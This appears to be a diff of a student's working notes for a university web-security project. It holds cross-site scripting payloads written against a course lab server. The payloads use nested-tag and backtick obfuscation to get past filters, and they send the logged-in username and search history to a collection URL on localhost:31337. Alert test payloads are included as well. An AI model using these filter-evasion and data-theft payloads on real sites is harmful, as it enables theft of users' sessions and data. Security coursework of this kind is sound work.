@@ -34,9 +34,12 @@ xss_2 PLAIN:
 https://project2.ecen4133.org/search?xssdefense=2&q=<scrscriptipt>$(window).load(function(){window.location='http://localhost:31337/?stolen_user='+$("#logged-in-user").text()+'	&last_search='+$("#history-list").children()[1].innerHTML})</scrscriptipt>
 
 
-xss_3 test:
-https://project2.ecen4133.org/search?xssdefense=3&q=<scrscriptipt>$(window).load(function(){window.location='`http://localhost:31337/?stolen_user='`%2B$("`%23logged-in-user"`).text()%2B'`	%26last_search='`%2B$("`%23history-list"`).children()[1].innerHTML})</scrscriptipt>
+xss_3 ENCODED:
+https://project2.ecen4133.org/search?xssdefense=3&q=<script>$(window).load(function(){window.location=`http://localhost:31337/?stolen_user=`%2B$(`%23logged-in-user`).text()%2B`	%26last_search=`%2B$(`%23history-list`).children()[1].innerHTML})</script>
 
+
+xss_3 PLAIN:
+https://project2.ecen4133.org/search?xssdefense=2&q=<script>$(window).load(function(){window.location=`http://localhost:31337/?stolen_user=`+$(`#logged-in-user`).text()+`	&last_search=`+$(`#history-list`).children()[1].innerHTML})</script>
 
 Alert tests: 
 <script>alert($(window).load(function(){$("#history-list").children()[1].text}))</script>
@@ -46,6 +49,7 @@ Alert tests:
 <script>alert($("#logged-in-user").text())</script>
 <scrscriptipt> `alert("this is a test")` </scrscriptipt>
 #this is called grave accent obfuscation, this works in small scale with an alert but im having trouble in the full link.
+#another way to do this is to just use ` backtick instead of using the ""
 
 
 malicious URL just stolen user (does not work):
